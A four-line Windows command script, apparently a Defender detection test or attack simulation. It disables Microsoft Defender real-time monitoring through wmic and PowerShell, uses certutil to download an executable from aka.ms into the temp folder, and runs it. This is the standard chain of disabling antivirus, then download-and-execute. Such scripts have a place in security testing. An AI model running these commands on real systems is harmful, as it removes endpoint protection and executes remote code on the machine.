wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring 1\""
timeout /t 10 /nobreak >nul
certutil.exe -urlcache -f "https://aka.ms/ioavtest" "%Temp%\validatecloud.exe"
cmd /c "%Temp%\validatecloud.exe"
